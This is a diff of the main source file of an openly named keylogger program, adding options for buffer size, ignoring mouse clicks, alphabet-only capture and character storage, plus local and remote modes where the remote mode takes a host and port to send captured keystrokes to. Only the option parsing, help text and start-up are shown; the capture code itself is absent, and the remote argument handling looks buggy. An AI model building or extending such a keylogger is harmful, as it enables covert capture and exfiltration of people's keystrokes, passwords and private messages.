@@ -1,13 +1,19 @@
 #include "./main.hpp"
 
-string* g_file_path = new string(DEFAULT_FILE_PATH);
+keylogger* g_keylogger = nullptr;
 
-keylogger* g_keylogger;
+size_t g_buffer_size;
+
+bool g_no_arrow;
+
+bool g_no_click;
+
+bool g_alphabet_only;
+
+bool g_store_character;
 
 BOOL exit_program()
 {
-	delete g_file_path;
-
 	delete g_keylogger;
 
 	exit (EXIT_FAILURE);
@@ -26,6 +32,18 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 			LONG_OPTION_REMOTE, required_argument, NULL, SHORT_OPTION_REMOTE
 		},
 		{
+			LONG_OPTION_BUFFER_SIZE, required_argument, NULL, SHORT_OPTION_BUFFER_SIZE
+		},
+		{
+			LONG_OPTION_NO_CLICK, no_argument, NULL, SHORT_OPTION_NO_CLICK
+		},
+		{
+			LONG_OPTION_ALPHABET_ONLY, no_argument, NULL, SHORT_OPTION_ALPHABET_ONLY
+		},
+		{
+			LONG_OPTION_STORE_CHARACTER, no_argument, NULL, SHORT_OPTION_STORE_CHARACTER
+		},
+		{
 			LONG_OPTION_HELP, no_argument, NULL, SHORT_OPTION_HELP
 		},
 		{
@@ -33,7 +51,7 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 		}
 	};
 
-	while ((t_result_option = getopt_long(p_arguments_number, p_arguments_value, "l:r:h:", t_long_options, &t_option_index))
+	while ((t_result_option = getopt_long(p_arguments_number, p_arguments_value, "l:r:b:acACh", t_long_options, &t_option_index))
 	    != -1)
 	{
 		switch (t_result_option)
@@ -42,48 +60,64 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 				if (strcasecmp(t_long_options[t_option_index].name, LONG_OPTION_LOCAL)
 				    == 0)
 				{
-					if (g_keylogger != nullptr)
-						delete g_keylogger;
-
-					g_keylogger = new keylogger_local(optarg);
+					g_keylogger = new keylogger_local(g_buffer_size, optarg);
 				}
 				else if (strcasecmp(t_long_options[t_option_index].name,
-					LONG_OPTION_FILE_PATH) == 0)
-					{
-						cout << "file path" << endl;
+					LONG_OPTION_REMOTE) == 0)
+				{
+						g_keylogger = new keylogger_remote(g_buffer_size, p_arguments_value[t_option_index]++, atoi(p_arguments_value[t_option_index]++));
+				}
+				else if (strcasecmp(t_long_options[t_option_index].name,
+					LONG_OPTION_HELP) == 0)
+				{
+						print_help();
 
-						g_file_path->clear();
-
-						g_file_path->append(optarg);
-					}
-					else if (strcasecmp(t_long_options[t_option_index].name,
-						LONG_OPTION_REMOTE) == 0)
-						{
-							if (g_keylogger != nullptr)
-								delete g_keylogger;
-
-							g_keylogger = new keylogger_remote(p_arguments_value[t_option_index]++, atoi(p_arguments_value[t_option_index]++));
-						}
-					else if (strcasecmp(t_long_options[t_option_index].name,
-						LONG_OPTION_HELP) == 0)
-						{
-							print_help();
-
-							exit_program();
-						}
+						exit_program();
+				}
+				else if (strcasecmp(t_long_options[t_option_index].name,
+					LONG_OPTION_BUFFER_SIZE) == 0)
+				{
+					g_buffer_size = atoi(optarg);
+				}
+				else if (strcasecmp(t_long_options[t_option_index].name,
+					LONG_OPTION_NO_CLICK) == 0)
+				{
+					g_no_click = true;
+				}
+				else if (strcasecmp(t_long_options[t_option_index].name,
+					LONG_OPTION_ALPHABET_ONLY) == 0)
+				{
+					g_alphabet_only = true;
+				}
+				else if (strcasecmp(t_long_options[t_option_index].name,
+					LONG_OPTION_STORE_CHARACTER) == 0)
+				{
+					g_store_character = true;
+				}
+			break;
 
 			case SHORT_OPTION_LOCAL:
-				if (g_keylogger != nullptr)
-					delete g_keylogger;
-
-				g_keylogger = new keylogger_local(optarg);
+				g_keylogger = new keylogger_local(g_buffer_size, optarg);
 			break;
 
 			case SHORT_OPTION_REMOTE:
-				if (g_keylogger != nullptr)
-					delete g_keylogger;
+				g_keylogger = new keylogger_remote(g_buffer_size, p_arguments_value[t_option_index]++, atoi(p_arguments_value[t_option_index]++));
+			break;
 
-				g_keylogger = new keylogger_remote(p_arguments_value[t_option_index]++, atoi(p_arguments_value[t_option_index]++));
+			case SHORT_OPTION_BUFFER_SIZE:
+				g_buffer_size = atoi(optarg);
+			break;
+
+			case SHORT_OPTION_NO_CLICK:
+				g_no_click = true;
+			break;
+
+			case SHORT_OPTION_ALPHABET_ONLY:
+				g_alphabet_only = true;
+			break;
+
+			case SHORT_OPTION_STORE_CHARACTER:
+				g_store_character = true;
 			break;
 
 			case SHORT_OPTION_HELP:
@@ -91,6 +125,8 @@ void initialize_options(int p_arguments_number, char** p_arguments_value)
 
 				exit_program();
 			break;
+
+
 		}
 	}
 }
@@ -100,14 +136,28 @@ void print_help()
 	cout << endl;
 	cout << HELP_MESSAGE << endl;
 	cout << endl;
+	cout << HELP_MESSAGE_REQUIERED << endl;
+	cout << endl;
 	cout << HELP_MESSAGE_LOCAL << endl;
 	cout << HELP_MESSAGE_LOCAL_EXAMPLE << endl;
 	cout << endl;
 	cout << HELP_MESSAGE_REMOTE << endl;
 	cout << HELP_MESSAGE_REMOTE_EXAMPLE << endl;
 	cout << endl;
+	cout << HELP_MESSAGE_OPTIONAL << endl;
+	cout << endl;
+	cout << HELP_MESSAGE_NO_CLICK << endl;
+	cout << HELP_MESSAGE_NO_CLICK_EXAMPLE << endl;
+	cout << endl;
+	cout << HELP_MESSAGE_ALPHABET_ONLY << endl;
+	cout << HELP_MESSAGE_ALPHABET_ONLY_EXAMPLE << endl;
+	cout << endl;
+	cout << HELP_MESSAGE_STORE_CHARACTER << endl;
+	cout << HELP_MESSAGE_STORE_CHARACTER_EXAMPLE << endl;
+	cout << endl;
 	cout << HELP_MESSAGE_HELP << endl;
 	cout << HELP_MESSAGE_HELP_EXAMPLE << endl;
+	cout << endl;
 	exit(EXIT_SUCCESS);
 }
 
@@ -122,7 +172,17 @@ int main(int p_arguments_number, char** p_arguments_value)
 	initialize_options(p_arguments_number, p_arguments_value);
 
 	if(g_keylogger != nullptr)
+	{
+		g_keylogger->set_buffer_size(g_buffer_size);
+
+		g_keylogger->set_no_click(g_no_click);
+
+		g_keylogger->set_alphabet_only(g_alphabet_only);
+
+		g_keylogger->set_store_character(g_store_character);
+
 		g_keylogger->start();
+	}
 	else
 		print_help();
 
